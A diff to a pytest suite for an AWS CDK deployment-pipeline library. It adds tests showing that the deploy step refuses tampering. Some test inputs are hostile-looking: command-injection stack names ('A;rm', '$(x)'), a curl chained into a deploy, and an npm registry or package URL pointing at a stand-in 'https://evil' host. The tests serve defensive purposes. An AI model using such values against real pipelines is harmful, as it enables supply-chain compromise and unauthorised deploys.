@@ -14,9 +14,13 @@ from specter_pipeline import Assembly, DeployStep, Gate, PostDeployStep, Runtime
 from specter_pipeline import testing as c
 from specter_pipeline.gate import (
     CDK_BIN,
+    DEPLOY_WORKDIR,
     SNAPSHOT_DIR,
     deploy_command,
     mentions_cdk_cli,
+    names_path,
+    owns_deploy_flag,
+    snapshot_commands,
 )
 from specter_pipeline.presets import (
     python_cdk_assembly,
@@ -73,6 +77,8 @@ def inputs(action: dict) -> set[str]:
         "true # comment\ncdk deploy B", "curl https://x/y#frag && cdk deploy B",
         "cdk --require-approval never deploy B", "npm install -g aws-cdk@2",
         "pip install x;cdk deploy B",
+        "node node_modules/aws-cdk/bin/cdk.js deploy B", "node node_modules/aws-cdk/lib/index.js",
+        "npx aws-cdk/ deploy B",
     ],
 )
 def test_the_cli_guard_sees_the_cdk_cli_anywhere(command):
@@ -195,7 +201,7 @@ def test_stacks_need_an_assembly():
         build(application_stage=None, deploy_step=DEPLOY)
 
 
-@pytest.mark.parametrize("arg", ["--app", "-a", "--build", "--output=x", "-o", "-va", "-ao", "--app=x"])
+@pytest.mark.parametrize("arg", ["--app", "-a", "--build", "--output=x", "-o", "-va", "-ao", "--app=x", "--no-app", "--no-build"])
 def test_deploy_args_cannot_take_over_the_deploy(arg):
     with pytest.raises(ValueError, match="which the construct sets"):
         DeployStep("app", stacks=["A"], deploy_args=[arg, "x"])
@@ -208,6 +214,37 @@ def test_require_approval_is_added_unless_the_repo_sets_it():
     assert deploy_command(["A"], ["--require-approval=broadening"]).endswith(
         "A --require-approval=broadening"
     )
+    # the CLI reads camelCase too; adding ours would make it fail on a duplicate flag
+    assert deploy_command(["A"], ["--requireApproval", "broadening"]).endswith(
+        "A --requireApproval broadening"
+    )
+    assert not owns_deploy_flag("-v") and not owns_deploy_flag("--outputs-file")
+
+
+@pytest.mark.parametrize(
+    "envs",
+    [[("12345", "us-east-1")], [("111122223333", "us-east")], [("111122223333",)], [("111122223333", "us-east-1", "x")]],
+)
+def test_deploy_environments_are_validated(envs):
+    with pytest.raises(ValueError, match="deploy_environments"):
+        DeployStep("app", stacks=["A"], deploy_environments=envs)
+
+
+def test_deploy_environments_add_only_bootstrap_roles_to_the_deploy_action():
+    t = asm_build(
+        deploy_step=DeployStep(
+            "app", ["./pre.sh"], stacks=["AppStack"],
+            deploy_environments=[("111122223333", "eu-west-1")],
+        )
+    )
+    docs = {
+        next(r["Ref"] for r in pol["Properties"]["Roles"]): json.dumps(pol["Properties"]["PolicyDocument"])
+        for pol in t.find_resources("AWS::IAM::Policy").values()
+    }
+    holders = [v for v in docs.values() if "role/cdk-hnb659fds-" in v]
+    assert len(holders) == 1, "only the deploy action may assume the CDK bootstrap roles"
+    assert "arn:aws:iam::111122223333:role/cdk-hnb659fds-*-role-111122223333-eu-west-1" in holders[0]
+    c.assert_standard_contract(t, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])
 
 
 @pytest.mark.parametrize("stack", ["", "-rf", "A B", "A;rm", "$(x)"])
@@ -241,8 +278,32 @@ def test_repo_work_runs_in_its_own_action_before_the_deploy():
         for pol in t.find_resources("AWS::IAM::Policy").values()
     }
     pre_role = next(v for v in policies.values() if "ssm:GetParameter" in v)
-    assert "sts:AssumeRole" not in pre_role
+    assert "role/cdk-hnb659fds-" not in pre_role
+    deploy_roles = [v for v in policies.values() if "role/cdk-hnb659fds-" in v]
+    assert len(deploy_roles) == 1 and "ssm:GetParameter" not in deploy_roles[0]
     c.assert_standard_contract(t, repo=REPO, gates=ASM_GATES, node_gates=["synth-check", "lint"])
+
+
+def test_the_deploy_action_gets_only_ci_true_while_pre_deploy_gets_the_step_env():
+    t = asm_build(deploy_step=DeployStep("app", ["./pre.sh"], stacks=["AppStack"], env={"NODE_OPTIONS": "--require ./x.js"}))
+    def env_of(step):
+        (proj,) = [r for r in c.projects(t).values() if r["Properties"]["Description"].endswith(f"/{step}")]
+        return {v["Name"]: v["Value"] for v in proj["Properties"]["Environment"]["EnvironmentVariables"]}
+    assert env_of("Deploy-app") == {"CI": "true"}
+    assert env_of("PreDeploy-app")["NODE_OPTIONS"] == "--require ./x.js"
+
+
+@pytest.mark.parametrize("approval", [True, False])
+@pytest.mark.parametrize("pre_deploy", [True, False])
+def test_run_order_holds_with_and_without_approval_and_pre_deploy(approval, pre_deploy):
+    step = DeployStep("app", ["./pre.sh"] if pre_deploy else [], stacks=["AppStack"])
+    t = asm_build(deploy_step=step, require_approval=approval)
+    order = {a["Name"]: a["RunOrder"] for a in c._stage(t, "Deploy")["Actions"]}
+    names = [n for n in ["Approve-Deploy", "PreDeploy-app", "Deploy-app", "Post-frontend"] if n in order]
+    assert [order[n] for n in names] == sorted(order[n] for n in names)
+    assert len({order[n] for n in names}) == len(names), "each runs strictly after the one before"
+    assert ("Approve-Deploy" in order) is approval and ("PreDeploy-app" in order) is pre_deploy
+    c.assert_deploy_ordering(t, require_approval=approval)
 
 
 def test_without_repo_work_there_is_no_pre_deploy_action(tpl):
@@ -256,8 +317,12 @@ def test_the_deploy_action_is_the_construct_s_alone(tpl):
     cmds = c.step_commands(tpl, "Deploy-app")
     assert cmds[0] == "test -f ./manifest.json || { echo \"no cloud assembly at .\"; exit 1; }"
     assert cmds[1] == f"rm -rf {SNAPSHOT_DIR} && mkdir -p {SNAPSHOT_DIR} && cp -R ./. {SNAPSHOT_DIR}/"
-    assert cmds[-1] == f"{CDK_BIN} deploy --app {SNAPSHOT_DIR} AppStack --require-approval never"
-    assert len(cmds) == 2 + 3 + 1  # snapshot, pinned CLI install, deploy
+    assert cmds[2].startswith(f"test ! -e {SNAPSHOT_DIR}/cdk.json ||")
+    assert cmds[-1] == (
+        f"rm -rf {DEPLOY_WORKDIR} && mkdir -p {DEPLOY_WORKDIR} && cd {DEPLOY_WORKDIR} && "
+        f"{CDK_BIN} deploy --app {SNAPSHOT_DIR} AppStack --require-approval never"
+    )
+    assert len(cmds) == 3 + 3 + 1  # snapshot, pinned CLI install, deploy
     (proj,) = [r for r in c.projects(tpl).values() if r["Properties"]["Description"].endswith("/Deploy-app")]
     assert "nodejs" in proj["Properties"]["Environment"]["Image"]
 
@@ -296,13 +361,35 @@ def test_scan_gate_and_deploy_read_the_same_artifact(tpl):
     assert c.step_mounts(tpl, "Gate-scan") == {out["Name"]: "cdk.out"}
 
 
-def test_a_gate_pointed_at_another_directory_fails_the_contract():
+def test_a_gate_pointed_at_another_directory_is_refused():
     gates = python_cdk_gates(assembly=True)  # reads cdk.out
-    t = asm_build(assembly=python_cdk_assembly(output_dir="infra/cdk.out"), gates=gates)
-    with pytest.raises(AssertionError, match="never refers to 'infra/cdk.out'"):
-        c.assert_builds_once(t, gates)
+    with pytest.raises(ValueError, match="none of its commands names that directory"):
+        asm_build(assembly=python_cdk_assembly(output_dir="infra/cdk.out"), gates=gates)
+    # and the reverse: assembly at cdk.out, gates told infra/cdk.out
+    with pytest.raises(ValueError, match="none of its commands names that directory"):
+        asm_build(assembly=python_cdk_assembly(), gates=python_cdk_gates(assembly=True, assembly_dir="infra/cdk.out"))
     gates = python_cdk_gates(assembly=True, assembly_dir="infra/cdk.out")
     c.assert_builds_once(asm_build(assembly=python_cdk_assembly(output_dir="infra/cdk.out"), gates=gates), gates)
+
+
+def test_the_contract_also_ties_gates_to_their_mount():
+    ok = Gate("scan", ["ls cdk.out"], uses_assembly=True)
+    t = asm_build(gates=[*GATES, ok])
+    elsewhere = Gate("scan", ["ls infra/cdk.out"], uses_assembly=True)
+    with pytest.raises(AssertionError, match="never refers to 'cdk.out'"):
+        c.assert_builds_once(t, [*GATES, elsewhere])
+
+
+@pytest.mark.parametrize(
+    "command,named",
+    [
+        ("ls cdk.out", True), ("test -f cdk.out/manifest.json", True), ("ls ./cdk.out/x", True),
+        ("find -H cdk.out -mindepth 1", True), ("ls infra/cdk.out", False), ("ls cdk.outdated", False),
+        ("bandit --exclude ./.venv,./cdk.outx", False), ("echo $cdk.out", False),
+    ],
+)
+def test_names_path(command, named):
+    assert names_path(command, "cdk.out") is named
 
 
 def test_assembly_step_installs_the_pinned_cli_then_synthesizes(tpl):
@@ -484,6 +571,22 @@ def test_access_analyzer_scans_every_assembly_and_refuses_to_scan_nothing(
 
 
 @pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
+@pytest.mark.parametrize("files,ok", [(["manifest.json", "A.template.json"], True),
+                                      (["manifest.json", "cdk.json"], False), ([], False)])
+def test_the_snapshot_refuses_a_missing_assembly_or_a_cdk_json(tmp_path, files, ok):
+    art = tmp_path / "art"
+    art.mkdir()
+    for f in files:
+        (art / f).write_text("{}")
+    snap = tmp_path / "snap"
+    cmds = [x.replace(SNAPSHOT_DIR, str(snap)) for x in snapshot_commands(".")]
+    r = subprocess.run(["bash", "-ec", "\n".join(cmds)], check=False, cwd=art, capture_output=True, text=True)
+    assert (r.returncode == 0) is ok, r.stdout + r.stderr
+    if ok:
+        assert sorted(p.name for p in snap.iterdir()) == sorted(files)
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
 def test_a_failing_scan_fails_the_gate(tmp_path):
     for rel in ["cdk.out/A.template.json", "cdk.out/assembly-P/B.template.json"]:
         (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
@@ -594,6 +697,15 @@ def _scan_in_parallel_with_assembly(res):
         (_insert(-1, "npm install -g --prefix /tmp/nodejs aws-cdk@1.0.0"), "exactly once"),
         (lambda r: _edit_deploy(r, lambda cmds: cmds.pop(0)), "runs commands besides"),
         (_extra_phase, "has phases besides build"),
+        (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp["phases"]["build"].__setitem__("finally", ["cdk deploy B"])), "settings besides commands"),
+        (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp["phases"]["build"].__setitem__("on-failure", "CONTINUE")), "settings besides commands"),
+        (lambda r: _edit_spec(r, "Deploy-app", lambda sp: sp.__setitem__("env", {"variables": {"NODE_OPTIONS": "x"}})), "extra keys"),
+        (lambda r: _project(r, "Deploy-app")["Environment"]["EnvironmentVariables"].append({"Name": "npm_config_registry", "Type": "PLAINTEXT", "Value": "https://evil"}), "besides CI"),
+        (lambda r: _project(r, "Deploy-app")["Environment"].__setitem__("Image", "aws/codebuild/amazonlinux-x86_64-lambda-standard:python3.12"), "Node Lambda image"),
+        (lambda r: _action(r, "Deploy", "Deploy-app")["Configuration"].__setitem__("EnvironmentVariables", "[]x"), "action-level"),
+        (lambda r: _edit_deploy(r, lambda cmds: cmds.__setitem__(cmds.index(next(x for x in cmds if "aws-cdk@" in x)), "npm install -g --prefix /tmp/nodejs aws-cdk@https://evil/x.tgz")), "pinned CDK CLI version"),
+        (lambda r: _edit_deploy(r, lambda cmds: cmds.pop(2)), "runs commands besides"),
+        (_set_last(lambda last: last.replace(f"cd {DEPLOY_WORKDIR} && ", "")), "does not deploy the assembly snapshot"),
         # the gates
         (lambda r: _drop_assembly_input(_action(r, "Gates", "Gate-scan")), "does not read the deployed"),
         (_scan_in_parallel_with_assembly, "does not wait for the assembly"),
